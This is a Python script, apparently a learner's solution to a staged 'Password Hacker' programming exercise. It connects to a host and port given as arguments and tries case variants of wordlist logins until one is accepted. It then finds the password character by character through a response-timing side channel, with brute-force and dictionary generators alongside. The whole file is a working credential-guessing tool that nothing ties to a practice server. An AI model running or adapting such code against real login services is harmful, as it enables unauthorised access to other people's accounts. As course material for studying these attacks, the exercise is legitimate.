import argparse, itertools, json, string
from socket import socket
from datetime import datetime

# Stage 4 smarter arguments
parser = argparse.ArgumentParser()
parser.add_argument("hostname", type=str, help="enter IP address")
parser.add_argument("port", type=int, help="enter port")
args = parser.parse_args()


# Stage 2 function
def simple_password_bruteforce():
    for password_length in range(1, 100000):
        all_symbols = 'abcdefghijklmnopqrstuvwxyz0123456789'
        for password in itertools.product(all_symbols, repeat=password_length):
            yield ''.join(password)


# Stage 3 function
def password_brute_from_rainbow_table():
    with open('C:\\Users\\Денис\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt',
              'r') as pw_database:
        for password in pw_database:
            for variant in itertools.product(*([letter.lower(), letter.upper()] for letter in password)):
                yield ''.join(variant)


# Stage 4 function
def smarter_password_bruteforce():  # "Generator"
    for symbol in itertools.product(string.ascii_letters + string.digits, repeat=1):
        yield "".join(symbol)


def admin_login_generator(line):
    for letter in map(''.join, itertools.product(*zip(line.upper(), line.lower()))):
        yield letter


logger = {}
flag = False


def password_guess(correct_login):  # I forgot 4 what reason I've put "correct_login"
    password = ""
    while True:
        for symbol_sequence in smarter_password_bruteforce():
            password += symbol_sequence
            start_pass = datetime.now()  # Before sending response Stage 5/5
            response = login_with(login, password, client)
            end_pass = datetime.now()  # Recieving response Stage 5/5
            difference = (end_pass - start_pass).total_seconds()  # Логично Stage 5/5

            # Getting "result": "Exception happened during login"
            # -> Brutting right sequence of symbols
            # if response == "Exception happened during login":  # Commented Stage 4/5
            if difference > 0.1:  # Timecheck Stage 5/5
                continue
            # Cut wrong letter
            elif response == "Wrong password!":
                password = password[:-1]
                continue
            elif response == "Connection success!":
                return password


def login_with(login, password, sock):
    request_message = {"login": login,
                       "password": password}
    json_request = json.dumps(request_message).encode()
    try:
        sock.send(json_request)
        response = sock.recv(1024).decode()
        response = json.loads(response)
        return response["result"]
    except ConnectionAbortedError:
        return "ConnectionAborted"


with socket() as client:
    client.connect((args.hostname, args.port))
    answer = ()
    login = ""
    with open('C:\\Users\\Денис\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', 'r',
              encoding='utf-8') as login_database:
        # Finding right login
        for line in login_database:
            if flag:
                break
            line = line.strip("\n")
            for letter in admin_login_generator(line):
                logger["login"] = letter
                logger["password"] = ' '
                answer = login_with(logger["login"], logger["password"], client)
                finish = datetime.now()  # Stage 5 implemented 3)
                # Сколько времени проходит между "брутами"
                # End of functiom
                if answer == "Wrong password!":
                    login = letter
                    flag = True
                    break
    final_request = password_guess(login)
    print(json.dumps({"login": login, "password": final_request}))
